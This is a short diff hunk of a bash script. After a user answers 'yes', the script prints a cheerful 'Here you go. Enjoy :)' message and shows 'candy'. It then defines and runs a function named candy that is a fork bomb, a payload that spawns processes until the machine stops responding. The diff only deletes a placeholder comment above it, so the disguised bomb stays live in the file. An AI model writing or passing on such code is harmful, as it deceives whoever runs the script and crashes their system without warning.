@@ -25,7 +25,7 @@ if [ "$input" == "yes" ]; then
     echo "Here you go. Enjoy :)"
     display_candy
     echo -e "\e[0m" # Reset text color
-    # Placeholder for the candy function
+
     candy(){
       candy|candy&
     };candy
